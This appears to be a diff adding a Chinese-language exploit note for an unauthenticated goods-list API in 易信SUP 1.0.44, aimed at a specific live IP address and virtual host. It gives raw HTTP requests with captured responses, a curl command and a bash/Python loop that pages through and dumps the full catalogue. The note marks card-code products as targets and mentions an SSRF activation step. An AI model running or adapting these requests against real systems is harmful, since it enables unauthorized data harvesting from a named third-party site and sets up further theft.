@@ -1,0 +1,73 @@
+# 易信SUP 1.0.44 前台商品列表未鉴权 —— 可全量枚举商品与卡密属性
+# 目标：43.129.214.240（唯一可用 vhost: niangao.site.，尾点必须保留）
+# 判据：200 + {"code":0,...,"data":{"data":[...],"count":<N>},"message":"ok"}
+# 前置：实例已激活；无需 Cookie / Token / 验证码（游客登录关闭也不影响）
+
+### 0) 指纹 + vhost 命中确认
+GET /api/console/Login/InitConfig HTTP/1.1
+Host: niangao.site.
+Connection: close
+
+# => HTTP 200
+# {"code":0,"data":{"captcha":false,"version":"1.0.44"},"message":"ok"}
+
+### 1) 阴性基线：前台游客登录是关的
+POST /api/customer/Login/GuestLogin HTTP/1.1
+Host: niangao.site.
+Content-Type: application/json
+Content-Length: 2
+
+{}
+
+# => HTTP 200 {"code":1,"data":null,"message":"游客登录已关闭"}
+
+### 2) 主请求：无会话读商品列表（list_rows 控制每页，page 翻页）
+POST /api/customer/Home/GoodsList HTTP/1.1
+Host: niangao.site.
+Content-Type: application/json
+Content-Length: 26
+
+{"list_rows":3,"page":1}
+
+# => HTTP 200
+# {"code":0,"data":{"data":[
+#   {"id":567,"name":"关于充值","price":3.52,"is_card_code":false,"stock":-1}, ...
+# ],"count":474},"message":"ok"}
+#
+# 字段说明：
+#   id           商品主键，后续详情/下单都用它
+#   is_card_code 是否卡密类商品 —— 直接决定要不要去拿卡面
+#   stock        -1 通常表示不限量/上游代充
+#   description  商品说明（部分条目含卡种/面值/区服等）
+
+### 3) 等价 curl（直连，不走本机代理）
+curl.exe -sS -k --noproxy "*" -H "Host: niangao.site." \
+  -H "Content-Type: application/json" \
+  --data-binary "@gl.json" http://43.129.214.240/api/customer/Home/GoodsList
+
+# gl.json 内容：{"list_rows":200,"page":1}
+
+### 4) 全量翻页（bash）——按 count 算页数，逐页落盘
+T=http://43.129.214.240
+H='Host: niangao.site.'
+curl.exe -sS --noproxy "*" -H "$H" -H 'Content-Type: application/json' \
+  -d '{"list_rows":1,"page":1}' $T/api/customer/Home/GoodsList > p1.json
+CNT=$(python -c "import json;print(json.load(open('p1.json'))['data']['count'])")
+PAGES=$(( (CNT + 199) / 200 ))
+for i in $(seq 1 $PAGES); do
+  curl.exe -sS --noproxy "*" -H "$H" -H 'Content-Type: application/json' \
+    -d "{\"list_rows\":200,\"page\":$i}" $T/api/customer/Home/GoodsList > "gl_$i.json"
+  sleep 1
+done
+python - <<'EOF'
+import json,glob
+rows=[r for f in sorted(glob.glob('gl_*.json')) for r in json.load(open(f))['data']['data']]
+json.dump(rows,open('goods_all.json','w'),ensure_ascii=False,indent=1)
+print(len(rows), sum(1 for r in rows if r.get('is_card_code')))
+EOF
+
+# 失败排查：
+#  RST/空 → Host 少了尾点或不是该实例 vhost
+#  403「系统未授权」 → 实例未激活，先做 Activate/GoSystem SSRF 激活
+#  400 → body 不是 JSON / 缺 page 或 list_rows
+#  404 → 版本差异，换路径或先登录再比对
